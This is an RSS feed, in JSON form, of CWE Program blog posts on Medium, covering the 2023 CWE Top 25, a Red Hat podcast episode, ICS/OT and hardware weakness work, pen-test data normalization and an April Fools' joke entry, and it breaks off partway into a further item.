{"?xml":{"@version":"1.0","@encoding":"UTF-8"},"rss":{"@xmlns:dc":"http://purl.org/dc/elements/1.1/","@xmlns:content":"http://purl.org/rss/1.0/modules/content/","@xmlns:atom":"http://www.w3.org/2005/Atom","@version":"2.0","@xmlns:cc":"http://cyber.law.harvard.edu/rss/creativeCommonsRssModule.html","channel":{"title":{"#cdata-section":"Stories by CWE Program on Medium"},"description":{"#cdata-section":"Stories by CWE Program on Medium"},"link":"https://medium.com/@CWE_CAPEC?source=rss-674e9717194c------2","image":{"url":"https://cdn-images-1.medium.com/fit/c/150/150/1*6qMGWeLVKOra01d99tTiag.jpeg","title":"Stories by CWE Program on Medium","link":"https://medium.com/@CWE_CAPEC?source=rss-674e9717194c------2"},"generator":"Medium","lastBuildDate":"Sun, 28 Jan 2024 05:30:33 GMT","atom:link":[{"@href":"https://medium.com/@CWE_CAPEC/feed","@rel":"self","@type":"application/rss+xml"},{"@href":"http://medium.superfeedr.com","@rel":"hub"}],"webMaster":{"#cdata-section":"yourfriends@medium.com"},"item":[{"title":{"#cdata-section":"Out-of-Bounds Read Podcast — “Red Hat’s CWE Journey”"},"link":"https://medium.com/@CWE_CAPEC/out-of-bounds-read-podcast-red-hats-cwe-journey-06c353778b50?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/06c353778b50"},"category":[{"#cdata-section":"cybersecurity"},{"#cdata-section":"vulnerability"},{"#cdata-section":"information-technology"},{"#cdata-section":"vulnerability-management"},{"#cdata-section":"information-security"}],"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Tue, 23 Jan 2024 03:05:39 GMT","atom:updated":"2024-01-23T03:22:33.047Z","content:encoded":{"#cdata-section":"<h3>Out-of-Bounds Read Podcast — “Red Hat’s CWE Journey”</h3><p>“<a href=\"https://cwe.mitre.org/news/podcast.html\">Out-Of-Bounds Read</a>” is the <a href=\"https://cwe.mitre.org/\">Common Weakness Enumeration (CWE™) Program</a>’s free podcast about common weaknesses in software and hardware, the vulnerabilities they cause, how to reduce them, and how using CWE can help make products more secure by design.</p><p>In this episode, CWE Program Lead Alec Summers talks with <a href=\"https://www.redhat.com/\">Red Hat</a>’s Przemyslaw Roguski, CWE Technical Lead Steve Christey, and CWE Top 25 Lead Connor Mullaly, about <a href=\"https://cwe.mitre.org/\">Common Weakness Enumeration (CWE™)</a> and the problem it solves; how Red Hat’s experience and relationship with CWE began and developed over time; how Red Hat uses CWE today, especially “<a href=\"https://cwe.mitre.org/data/definitions/699.html\">CWE-699: Software Development</a>”; how CWE’s different “<a href=\"https://cwe.mitre.org/data/index.html#navigate_cwe\">views</a>” can be used to educate and enable new and/or existing CWE users; CWE mappings and why mapping to CWEs/root cause weaknesses is important in vulnerability disclosure; the <a href=\"https://cwe.mitre.org/top25/index.html\">CWE Top 25 list</a>; CWE in the software development lifecycle; how ongoing development of CWE benefits users; and more.</p><p>Additional details about Red Hat’s ongoing use of CWE are included in these two articles on the Red Hat blog, “<a href=\"https://www.redhat.com/en/blog/red-hat-cwe-journey\">Red Hat’s CWE journey</a>” and “<a href=\"https://www.redhat.com/en/blog/weakness-risk-patterns\">Weakness risk-patterns: A Red Hat way to identify poor software practices in the secure development lifecycle</a>.”</p><figure><img alt=\"Listen to the CWE Podcast — “Red Hat’s CWE Journey” — on our YouTube Channel\" src=\"https://cdn-images-1.medium.com/max/1024/1*ogaiHRXRiAeSEdKHi_-iHw.png\" /><figcaption><a href=\"https://youtu.be/T73dfE2iLyw?si=qi07j3ROLO5KAcp-\">https://youtu.be/T73dfE2iLyw?si=qi07j3ROLO5KAcp-</a></figcaption></figure><p>The <a href=\"https://youtu.be/T73dfE2iLyw?si=62z1ItWVWzi7veaH\">podcast</a> is available for free on the <a href=\"https://www.youtube.com/channel/UCpY9VIpRmFK4ebD6orssifA\">CWE Program Channel on YouTube</a>. Please give the episode a listen and let us know what you think!</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=06c353778b50\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"“2023 CWE Top 25 Most Dangerous Software Weaknesses” List Now Available"},"link":"https://medium.com/@CWE_CAPEC/2023-cwe-top-25-most-dangerous-software-weaknesses-list-now-available-68c2d00f49b5?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/68c2d00f49b5"},"category":[{"#cdata-section":"software-development"},{"#cdata-section":"information-technology"},{"#cdata-section":"software-architecture"},{"#cdata-section":"software-testing"},{"#cdata-section":"cybersecurity"}],"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Fri, 07 Jul 2023 00:55:00 GMT","atom:updated":"2023-07-07T13:25:54.513Z","content:encoded":{"#cdata-section":"<p>The “<a href=\"https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html\">2023 Common Weakness Enumeration (CWE) Top 25 Most Dangerous Software Weaknesses</a>” (CWE Top 25) list was released on June 21, 2023, on the <a href=\"https://cwe.mitre.org/\">CWE website</a>.</p><figure><img alt=\"Common Weakness Enumeration (CWE™) Top 25 Most Dangerous Software Weaknesses list logo\" src=\"https://cdn-images-1.medium.com/max/257/1*mHQLNta3XaSDSF5n0jgzmA.png\" /><figcaption><a href=\"https://cwe.mitre.org/top25/\">https://cwe.mitre.org/top25/</a></figcaption></figure><p>The CWE Top 25 is calculated by analyzing public vulnerability data in the National Institute of Standards and Technology’s (NIST) <a href=\"https://nvd.nist.gov/\">U.S. National Vulnerability Database (NVD)</a> for root cause mappings to CWE weaknesses for the previous two calendar years. These weaknesses lead to serious vulnerabilities in software. An attacker can often exploit these vulnerabilities to take control of an affected system, steal data, or prevent applications from working.</p><p>The 2023 CWE Top 25 also incorporates updated weakness data for recent <a href=\"https://www.cve.org/\">Common Vulnerabilities and Exposures (CVE®)</a> records in the dataset that are part of Cybersecurity and Infrastructure Security Agency (CISA)’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">Known Exploited Vulnerabilities Catalog (KEV)</a>.</p><p>Trend analysis on vulnerability data like this enables organizations to make better investment and policy decisions in vulnerability management. Many professionals who deal with software will find the CWE Top 25 a practical and convenient resource to help mitigate risk.</p><h3><strong>What’s Changed</strong></h3><p>There are several notable shifts in ranked positions of weakness types from last year’s list, including weaknesses dropping away or making their first appearance in a Top 25.</p><p>Weakness types moving higher on the list include <a href=\"https://cwe.mitre.org/data/definitions/416.html\">CWE-416: Use After Free</a>, <a href=\"https://cwe.mitre.org/data/definitions/862.html\">CWE-862: Missing Authorization</a>, <a href=\"https://cwe.mitre.org/data/definitions/269.html\">CWE-269: Improper Privilege Management</a>, and <a href=\"https://cwe.mitre.org/data/definitions/863.html\">CWE-863: Incorrect Authorization</a>, while <a href=\"https://cwe.mitre.org/data/definitions/502.html\">CWE-502: Deserialization of Untrusted Data</a>, <a href=\"https://cwe.mitre.org/data/definitions/798.html\">CWE-798: Use of Hardcoded Credentials</a>, and <a href=\"https://cwe.mitre.org/data/definitions/276.html\">CWE-276: Incorrect Default Permissions</a> moved down.</p><p>Two weaknesses fell off the Top 25 list this year, <a href=\"https://cwe.mitre.org/data/definitions/400.html\">CWE-400: Uncontrolled Resource Consumption</a><strong> </strong>and <a href=\"https://cwe.mitre.org/data/definitions/611.html\">CWE-611: Improper Restriction of XML External Entity Reference</a>.</p><p>Visit the <a href=\"https://cwe.mitre.org/top25/archive/2023/2023_key_insights.html\">Key Insights</a> page for additional information.</p><h3><strong>Leveraging Real-World Data</strong></h3><p>To create the 2023 list, the CWE Program leveraged <a href=\"https://www.cve.org/\">CVE</a> data found within the <a href=\"https://nvd.nist.gov\">NVD</a> and the <a href=\"https://nvd.nist.gov/vuln-metrics/cvss\">Common Vulnerability Scoring System (CVSS)</a> scores associated with each CVE Record, including a focus on CVE Records from CISA’s <a href=\"https://www.cisa.gov/known-exploited-vulnerabilities-catalog\">KEV Catalog</a>. A formula was then applied to the data to score each weakness based on prevalence and severity.</p><p>The 2023 CWE Top 25 leverages NVD data from the years 2021 and 2022. A scoring formula is used to calculate a ranked order of weaknesses which combines the frequency that a CWE is the root cause of a vulnerability with the average severity of each of those vulnerabilities’ exploitation as measured by CVSS. In both cases, the frequency and severity are normalized relative to the minimum and maximum values seen.</p><p>For more information about how the list was created and the ranking methodology, visit <a href=\"https://cwe.mitre.org/top25/archive/2023/2023_methodology.html\">Methodology: How the 2023 CWE Top 25 Most Dangerous Software Weaknesses Was Created</a>. Be sure to also check out the <a href=\"https://cwe.mitre.org/top25/\">CWE Top 25</a> page on the CWE website in the coming weeks for additional articles and insight.</p><h3>The 2023 CWE Top 25</h3><figure><img alt=\"2023 CWE Top 25\" src=\"https://cdn-images-1.medium.com/max/932/1*7yT9Jt58KBalAJCAVFYy7A.png\" /><figcaption>View list on CWE website: <a href=\"https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html\"><strong>https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html</strong></a></figcaption></figure><h3>Follow-on Information Coming Soon</h3><p>Over the coming weeks, the CWE Program will be publishing a series of further articles and useful information to help illustrate how vulnerability management plays an important role in shifting the balance of cybersecurity risk. These include:</p><ul><li><strong>Weaknesses on the Cusp</strong> — those that did not make the 2023 CWE Top 25 of which you should be aware.</li><li><strong>Trends in Real-World CWEs: 2019 to 2023</strong> — A discussion of overall trends and what it means for your IT infrastructure.</li><li><strong>Actively Exploited</strong> — Ranking Weaknesses by CISA’s KEV Catalog.</li><li><strong>CWEs and Root-Cause Mapping</strong> — The path to clarifying sources of vulnerabilities as we as a community work to eradicate vulnerabilities from your IT infrastructure.</li><li><strong>CWE Top 25 Remapping Notes</strong> — The team’s root cause mapping analysis notes by CVE Record for the manually reviewed 2023 CWE Top 25 data set.</li></ul><p>Visit the <a href=\"https://cwe.mitre.org/\">CWE website</a> regularly for updates.</p><h3>Check out the 2023 Top 25 Now</h3><p><a href=\"https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html\">https://cwe.mitre.org/top25/archive/2023/2023_top25_list.html</a></p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=68c2d00f49b5\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"Community Actively Working to Enhance CWE’s ICS/OT Coverage"},"link":"https://medium.com/@CWE_CAPEC/community-actively-working-to-enhance-cwes-ics-ot-coverage-1b4f7bf0a6dd?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/1b4f7bf0a6dd"},"category":[{"#cdata-section":"industry"},{"#cdata-section":"industrial"},{"#cdata-section":"information-security"},{"#cdata-section":"information-technology"},{"#cdata-section":"industry-insights"}],"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Wed, 30 Nov 2022 01:03:28 GMT","atom:updated":"2022-11-30T01:03:28.189Z","content:encoded":{"#cdata-section":"<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*B4Fyaz3xwNphZiGmVCqeBw.jpeg\" /></figure><p>Work related to describing and classifying security weaknesses in information technology (IT) through efforts such as <a href=\"https://cwe.mitre.org/\">Common Weakness Enumeration (CWE™)</a>/<a href=\"https://capec.mitre.org/\">Common Attack Pattern Enumerations and Classifications (CAPEC™)</a> has been a major focus of the community for some time. However, a similar requirement for industrial control systems (ICS)/operational technology (OT) has been identified but not yet received similar attention — that is, until now.</p><p>Earlier this year, representatives from the ICS/OT and <a href=\"https://cwe.mitre.org/\">CWE</a>/<a href=\"https://capec.mitre.org/\">CAPEC</a> communities joined together to create a special interest group (SIG) to address the need for describing and managing security weaknesses in ICS/OT systems.</p><h3><strong>Introducing the “CWE-CAPEC ICS/OT SIG”</strong></h3><p><a href=\"https://cwe.mitre.org/news/index.html#april212022_Join_the_CWE_CAPEC_ICS_OT_SIG\">Formed in April 2022</a> by a partnership between the <a href=\"https://www.energy.gov/\">U.S. Department of Energy</a>’s (DOE) <a href=\"https://www.energy.gov/ceser/office-cybersecurity-energy-security-and-emergency-response\">Office of Cybersecurity, Energy Security, and Emergency Response</a> (CESER) and the <a href=\"https://cwe.mitre.org/\">CWE/CAPEC Program</a> (operated by the <a href=\"https://www.dhs.gov/cisa/cybersecurity-division\">CISA</a>-funded <a href=\"https://www.dhs.gov/science-and-technology/hssedi\">Homeland Security Systems Engineering and Development Institute (HSSEDI)</a>), the <a href=\"https://cwe.mitre.org/documents/CWE-CAPEC_ICS_OT_SIG.pdf\">CWE-CAPEC ICS/OT SIG</a> is a forum for researchers and technical representatives from organizations operating in ICS/OT design, manufacturing, and security to interact, share opinions and expertise, and leverage each other’s experiences in supporting continued growth and adoption of CWE as a common language for defining ICS/OT security weaknesses and their associated patterns of attack.</p><p>The CWE-CAPEC ICS/OT SIG helps all stakeholders communicate more efficiently and effectively and promote a unity of effort in identifying and mitigating ICS/OT security weaknesses, especially in critical infrastructure. Participants include ICS/OT vulnerability researchers, engineers, security professionals, and companies representing OEMs/system integrators, tools/infrastructure vendors, and asset owners and operators.</p><h3><strong>Early Progress</strong></h3><p>Properly identifying a problem is the first step in addressing it. The CWE-CAPEC ICS/OT SIG has determined that while IT has an extant body of work related to identify and classifying security weaknesses, IT and ICS/OT are different, and existing IT classifications are not always useful in describing and managing security weaknesses in ICS/OT systems. Therefore, addressing this gap will help all stakeholders communicate more efficiently and effectively and promote a unity of effort in identifying and mitigating ICS/OT security weaknesses, especially in critical infrastructure.</p><p>Towards that end, the CWE-CAPEC ICS/OT SIG has stood-up two sub-working groups to focus on areas of special interest as a first step towards helping set the groundwork for enhancing CWE’s ICS/OT content:</p><ul><li><strong>“Boosting CWE Content” Sub-Working Group — </strong>This sub-working group will engage stakeholders in boosting CWE content for ICS/OT, including expanding content when applicable by adding new entries or enhancing existing entries. The effort will identify gaps in the current <a href=\"https://cwe.mitre.org/data/definitions/1358.html\">ICS/OT CWE View</a> and analyze the scope and nature of those gaps. The effort will also add appropriate weaknesses to categories without any weaknesses, where supported by CWE’s established scope. The group will also contribute to public discussions of potential changes to CWE’s scope that may benefit the ICS/OT community. Boosting may include the identification of sub-domains of weaknesses.</li><li><strong>“Mapping CWE to ISA/IEC 62443” Sub-Working Group — </strong>The goal of this sub-working group is to have a documented association of the CWE list of software and hardware weakness types to the current ISA/IEC 62443 cybersecurity standards in ICS/OT. If there are no restrictions imposed by ISA or other parties, then CWE will capture these associations using “Taxonomy Mappings” elements within the relevant CWE weaknesses. The group will also contribute to public discussions of potential changes to CWE’s scope that may benefit the ICS/OT community.</li></ul><h3><strong>Participation Encouraged!</strong></h3><p>We are at the beginning stages of this effort, and while the CWE-CAPEC ICS/OT SIG has made early progress, this is a long-term effort that will benefit significantly from ongoing community participation. To learn how you can participate, visit <a href=\"https://github.com/CWE-CAPEC/ICS-OT_SIG\">https://github.com/CWE-CAPEC/ICS-OT_SIG</a>.</p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=1b4f7bf0a6dd\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"How to Effectively Utilize Hardware CWEs Across your Organization"},"link":"https://medium.com/@CWE_CAPEC/how-to-effectively-utilize-hardware-cwes-across-your-organization-3fd100d408c1?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/3fd100d408c1"},"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Fri, 13 May 2022 14:46:45 GMT","atom:updated":"2022-05-13T14:46:45.393Z","content:encoded":{"#cdata-section":"<figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/1024/1*68soRVxOxiN0-VRDPSh-eA.jpeg\" /></figure><p>How to Effectively Utilize Hardware CWEs Across your Organization</p><p><em>The CWE/CAPEC Program partners with organizations around the world to further the program’s mission and objectives. The views and opinions expressed do not necessarily state or reflect those of the CWE/CAPEC Program, and any reference to a specific product, process, or service does not constitute or imply an endorsement by the CWE/CAPEC Program of the product, process, or service, or its producer or provider.</em></p><p>We are pleased to welcome one of our key partners, <a href=\"https://tortugalogic.com/\">Tortuga Logic</a>, which has composed this posting and provided the picture for our blog.</p><h3>What is a Hardware CWE?</h3><p>The Common Weakness Enumeration (CWE) has been effective at guiding more secure software design and analysis for over 10 years. While software security continued to become more established during this time, hardware security was unfortunately lagging behind. Since the introduction of CWEs for software, there has been a significant increase in hardware vulnerabilities according to the National Vulnerability Database (NVD). As a result, the hardware and semiconductor industry began to become increasingly aware that they were greatly in need of similar solutions to help design more secure hardware. In response, MITRE, in collaboration with industry leaders including Intel and Tortuga Logic, released a taxonomy focused specifically on hardware in February 2020.</p><p>Since its inception, the hardware CWE initiative has gained significant traction by classifying approximately 100 hardware weaknesses to date, creating a monthly <a href=\"https://cwe.mitre.org/documents/HW_CWE_SIG.pdf\">Hardware CWE Special Interest Group (SIG)</a> meeting, and establishing a list of the <a href=\"https://cwe.mitre.org/scoring/lists/2021_CWE_MIHW.html\">Most Important Hardware Weaknesses</a> in October 2021.</p><p>While it’s promising to see the adoption and support of hardware CWE growing every month, many organizations are still unsure how to effectively apply CWEs across their organizations to realize the most value.</p><h3>How can Hardware CWE be effectively applied in semiconductor organizations?</h3><p>Through our collaborative security work with our customers, we have identified two effective ways that hardware CWE can be applied to enable higher levels of security assurance throughout semiconductor organizations.</p><h3>1. As a Security Metric</h3><p>CWE is an invaluable security metric. We see organizations starting to adopt a weakness-focused approach to their overall security program to help quantify assurance for their products. This follows a general process of:</p><ol><li><strong>Defining a Threat Model</strong>: Start by identifying the relevant threats for the products being developed. This helps level-set the threats that are in scope and those that are not and helps bound the number of security requirements for the product.</li><li><strong>Specifying Security Requirements and Associated CWEs:</strong> Create compact security requirements based on the threat model and use CWE as an essential guide throughout this process. For hardware, we advocate for creating security requirements centered around design assets since it makes security requirements significantly easier to verify. With the association of CWEs, organizations can have quantifiable assurance that they have addressed any known weaknesses for their product.</li><li><strong>Verifying Security Requirements Throughout the Design Cycle:</strong> With the help of CWEs and asset-based security requirements, concise verification environments can be created to effectively verify the security requirements. <a href=\"https://tortugalogic.com/technical-overview/\">Tortuga Logic’s Radix products</a> serve as a good solution due to its ability to succinctly map security requirements and CWEs to Radix’s Security Rules and the ease of integration into the existing semiconductor design flows.</li><li><strong>Demonstrating Quantitative Security Sign-off: </strong>As a final step, all CWEs that are within the scope of the threat model can be enumerated to ensure proper coverage by the security requirements and test plan to facilitate a security sign-off. This enables quantitative evidence that all known weaknesses within the scope of the organization’s threat model are effectively covered and addressed.</li></ol><h3>2. As a Root Cause Weaknesses for CVE Numbering Authorities</h3><p>The second application of CWEs is its use as part of the vulnerability disclosure process. A <a href=\"https://www.cve.org/ProgramOrganization/CNAs\">CVE Numbering Authority (CNA)</a> is an organization responsible for assigning a CVE number to disclosed vulnerability in a product. As of this blog, there are 215 CNA partners around the world varying from open-source projects to large organizations.</p><p>Most large enterprises operate their own CNA for their products. Stated differently, they take on the responsibility of conducting the public disclosure process for vulnerabilities found in their products and assigning a CVE number. For example, NVIDIA, Intel, Qualcomm, Samsung, Apple, Microsoft, Google, and many others are listed as addressing vulnerabilities for their products.</p><p>Through the vulnerability disclosure process, the CNAs are responsible for identifying the root cause weakness (CWEs) to help articulate what the attacker utilized to be successful in exploiting the vulnerability and it provides the foundation for helping quantify the pervasiveness of certain weaknesses. With the introduction of hardware CWE, we see industry leaders becoming more effective at helping classify the root cause of vulnerabilities to specific hardware weaknesses which is something they were unable to do in the past. This trend will dramatically help organizations understand the most common hardware weaknesses for their products and design better mitigations to address them going forward.</p><h3>Takeaways</h3><p>While hardware CWE is still in its infancy, the amount of adoption and traction in the industry is very encouraging. We continue to see adoption of hardware CWEs across the industry for both an invaluable security metric and for enabling a more quantitative vulnerability disclosure process and see no indication that that momentum is slowing down. I encourage readers of this blog to get involved in the hardware CWE initiative by participating in the <a href=\"https://cwe.mitre.org/documents/HW_CWE_SIG.pdf\">Hardware CWE Special Interest Group </a>or one of the other special interest and working groups focused on improving the overall CWE program. To learn more about our <a href=\"https://tortugalogic.com/technical-overview/\">Radix technology</a> and how we can help, please visit <a href=\"https://tortugalogic.com/\">our website</a>.</p><p><strong>– Jason Oberg, Co-Founder and CTO of Tortuga Logic</strong></p><p><strong><em>Have a topic you would like to share about CWE/CAPEC? Please contact us at </em></strong><a href=\"mailto:capec@mitre.org\"><strong><em>capec@mitre.org</em></strong></a><strong><em> or </em></strong><a href=\"mailto:cwe@mitre.org\"><strong><em>cwe@mitre.org</em></strong></a><strong><em>!</em></strong></p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=3fd100d408c1\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"The Missing Piece in Vulnerability Management"},"link":"https://medium.com/@CWE_CAPEC/the-missing-piece-in-vulnerability-management-c8c7c0e55e5f?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/c8c7c0e55e5f"},"category":[{"#cdata-section":"vulnerability-management"},{"#cdata-section":"information-security"},{"#cdata-section":"information-technology"},{"#cdata-section":"pentesting"},{"#cdata-section":"cybersecurity"}],"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Wed, 04 May 2022 13:21:41 GMT","atom:updated":"2022-05-11T13:49:39.353Z","content:encoded":{"#cdata-section":"<p><em>The </em><a href=\"https://cwe.mitre.org\"><em>CWE</em></a><em>/</em><a href=\"https://capec.mitre.org\"><em>CAPEC</em></a><em> Program partners with organizations around the world to further the program’s mission and objectives. The views and opinions expressed do not necessarily state or reflect those of the CWE/CAPEC Program, and any reference to a specific product, process, or service does not constitute or imply an endorsement by the CWE/CAPEC Program of the product, process, or service, or its producer or provider.</em></p><p>We are pleased to welcome one of our key partners, <a href=\"https://attackforge.com/\">AttackForge</a>, which has composed this posting for our blog.</p><figure><img alt=\"The Missing piece by Stiller Beobachter\" src=\"https://cdn-images-1.medium.com/max/599/1*lD_ujAIOwFmdDHtIui4ZHw.png\" /></figure><p>I would like to share my views on one of the biggest challenges I see in the vulnerability management (VM) space — normalization of pen testing results so that they can be merged with vulnerability management systems — and how <a href=\"https://capec.mitre.org/\">Common Attack Pattern Enumeration and Classification (CAPEC™)</a> is part of the solution to that problem.</p><p>I’ve been in pen testing for the last decade, helping companies establish and improve their pen testing programs. I’ve worked for a large consultancy; run my own consultancy; and more recently as one of the co-founders at <a href=\"https://attackforge.com/\">AttackForge</a>, focusing on process improvement for pen testing.</p><p><strong>Vulnerability Management</strong></p><p>Let’s start with: what is vulnerability management?</p><p>Vulnerability management is the process of identifying, normalizing, evaluating, treating, and then reporting on security vulnerabilities in systems. Some organizations have large teams dedicated to just this. They collect data and report back to executives to inform if the company is getting better or worse at closing security gaps.</p><p>When we consider what data goes into vulnerability management, we should consider data from vulnerability scanners, static analysis tools, as well as pen test findings. However, most organizations fail to incorporate pen test data into vulnerability management. There’s good reason for it, but first: why is it a problem?</p><p><strong>Pen Testing Data</strong></p><p>Pen testing data usually produces complex and arbitrary vulnerabilities, such as zero-day vulnerabilities or vulnerabilities in business logic. If vulnerability management can’t see these often-critical vulnerabilities, they likely never get fixed.</p><p>In vulnerability management, vulnerabilities are the input. Tools do all the crunching and normalization. The output is the known security posture for an asset. Risk teams use this when deciding what to fix and when.</p><p>Vulnerability scanners and static application security testing (SAST)<strong> </strong>tools usually include industry references and tags when registering vulnerabilities in VM tools, such as CAPEC, <a href=\"https://cwe.mitr.org\">Common Weakness Enumeration (CWE™)</a>, and <a href=\"https://www.cve.org\">CVE</a>. This allows for efficient and effective normalization.</p><p>When it comes to pen test findings, at most you might get a <a href=\"https://www.first.org/cvss/\">Common Vulnerability Scoring System (CVSS)</a>, but that alone is not enough to normalize the data. Most pen test findings will not have a CVE. They may have a CAPEC or CWE, if your pen testers like you. And to make matters worse, pen test data is arbitrarily defined based on how the pen tester feels at the time.</p><p><em>This makes normalization impossible.</em></p><p>Most VM tools struggle to bring pen test data into vulnerability management.</p><p>The deliverable from a pen test is usually human-readable, for example a static PDF or Doc report. Pen testers spend days and weeks creating the perfect report, to avoid making the report feel pre-canned. You’re not going to get the same report from two different vendors, or even two different pen testers.</p><p>You can see for yourself if you search in Google for “GitHub Pen Test reports”. The first link you’ll find is to Julio Cesar Fort’s public GitHub repository, which is quite popular. It has samples from companies all over the world. You can browse through each one, and you’ll start to see the problem — inconsistency in pen test data, causing a major bottleneck for vulnerability management.</p><p><strong>Normalized Findings</strong></p><p>How do we turn those static reports into normalized findings?</p><p>The definitions and recommendations for vulnerabilities change between each pen tester or person doing quality assessments (QA). There’s no easy way to determine if they are the same ones you are tracking in VM.</p><p>Even if you receive the data in a consistent format with CVSS, CWE, and CAPEC references, how do you get that into your VM tools to process it? They were never designed to deal with arbitrary data or multiple tagging.</p><p>This combination of problems, starting with how pen testing is done, the deliverables and the output, to the current state of VM tools, implies that pen test data is unlikely to be included in your vulnerability management system.</p><p>So how do we actually fix it?</p><p><strong>The Solution</strong></p><p>First, we need an industry standard for tagging pen test findings. Something easy to understand and use, which VM tools can incorporate — similar to CVE and CVSS. This standard would need to handle different types of vulnerabilities: application, API, infrastructure, mobile, thick clients, IoT, etc. I see CAPEC as a natural fit to solving this.</p><p>We also need to train people to use this standard. This would finally allow to compare apples with apples.</p><p>Once we have standardized tagging and structured vulnerability fields, we need to get this to security teams in machine-readable formats.</p><p>Finally, VM tools can incorporate this into their processes, and normalize pen test findings. Humans will be able to see pen test vulnerabilities inside VM tools, take action, and report on them. Ultimately more things will get fixed.</p><p>In summary, I consider the solution to this problem is standardization and collaboration. We need to work together and not against each other to stay one step ahead of the bad folks.</p><p>– Fil Filiposki, co-founder of <a href=\"https://attackforge.com/\">AttackForge</a></p><p><em>Have a topic you would like to share about CWE/CAPEC? Please contact us at </em><a href=\"mailto:capec@mitre.org\"><em>capec@mitre.org</em></a><em> or </em><a href=\"mailto:cwe@mitre.org\"><em>cwe@mitre.org</em></a><em>!</em></p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=c8c7c0e55e5f\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"New CWE Entry, CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to…"},"link":"https://medium.com/@CWE_CAPEC/new-cwe-entry-cwe-ffff-use-of-a-potentially-dangerous-electronic-programmable-machine-to-d4531a85019b?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/d4531a85019b"},"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Fri, 01 Apr 2022 11:37:57 GMT","atom:updated":"2022-04-01T11:37:57.710Z","content:encoded":{"#cdata-section":"<h3><strong>New CWE Entry, CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to Automatically Carry Out Sequences of Arithmetic or Logical Operations (‘You are Using a Computer’)</strong></h3><figure><img alt=\"\" src=\"https://cdn-images-1.medium.com/max/544/1*CRhnjmeVaNkOHk-vg4KBlQ.png\" /></figure><p>On the CWE team, we know that identifying the root cause weakness of a vulnerability is not always a straight-forward and easy task. We also know that in order to do so, the CWE corpus must be as complete as possible so that each new CVE® record can reference at least one underlying cause. To this end, CWE is introducing a new entry, <strong>CWE-FFFF: Use of a Potentially Dangerous Electronic Programmable Machine to Automatically Carry Out Sequences of Arithmetic or Logical Operations (‘You are Using a Computer’)</strong>.</p><p>Everyone knows that it is much easier to mess things up at scale when you use a computer. To imagine this new CWE in action, let’s say you find a new XSS vulnerability, and you aren’t sure whether to map it to CWE-79:<strong> </strong>Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’) or one of its many children. Just slap a CWE-FFFF on it and you are good to go!</p><p>Imagine the time you can save in mapping your CVE records to their underlying root causes. As virtually all CVEs involve using a computer, just submit a CVE with a CWE-FFFF. You can create thousands of new CVEs, boosting your resume and career. We’re sure that there are plenty of times computers did not do what you wanted them to.</p><p>Also, CWE-FFFF is great for situations where you want to generate more revenue or sound impressive.</p><p>To generate revenue:</p><p>Client: “I can’t get it to work, can you look at it?”</p><p>You (poking the computer with a stick a few times): “Looks like you have a classic CWE-FFFF weakness. I can estimate that it will take me 20 hours to know better what is going on. Do you want to sign a contract?”</p><p>To impress others:</p><p>You: “I’m glad you came to me with your problem. I immediately see what is wrong, we just have to fix the CWE-FFFF problem. They are hard to discover.”</p><p>Others: “Wow, you are so smart and knowledgeable. I really respect that you know so much about computers, let me buy you lunch.”</p><p>Some might say that CWE-FFF is the weakness that underlies all of society’s vulnerabilities, but remember, there were problems before Grace Hopper discovered the first real bug.</p><p>In our next blog, we will cover the related attack pattern for CWE-FFFF, namely <strong>CAPEC-EEEE: Denial of Electron Transmissibility (‘Unplugging the Computer’)</strong>. It’s just coincidence how the ID matches the sound that people make when an adversary tries that.</p><p><strong>But seriously, folks…</strong></p><p><strong>You might have noticed that we released this on April 1st. We wrote this blog to highlight the fact that while most try to find the actionable and relevant CWE-mappings for their CVE records, a minority of folks overly rely on very broad, class-level weaknesses like CWE-20: Improper Input Validation or CWE-284: Improper Access Control. These mappings make it hard for defenders to know what compensating controls are best to put in place while waiting to patch. Additionally, it does not help the community determine what specific weakness are the most common, so that they can focus on fixes for them. So, as you continue discovering new vulnerabilities, try and take that extra moment to consider actionability and the appropriate level of specificity when you map them to their related CWEs.</strong></p><img src=\"https://medium.com/_/stat?event=post.clientViewed&referrerSource=full_rss&postId=d4531a85019b\" width=\"1\" height=\"1\" alt=\"\">"}},{"title":{"#cdata-section":"Celebrating the 15th anniversary of CAPEC™"},"link":"https://medium.com/@CWE_CAPEC/y-celebrating-the-15th-anniversary-of-capec-43c2b8d705e1?source=rss-674e9717194c------2","guid":{"@isPermaLink":"false","#text":"https://medium.com/p/43c2b8d705e1"},"dc:creator":{"#cdata-section":"CWE Program"},"pubDate":"Wed, 23 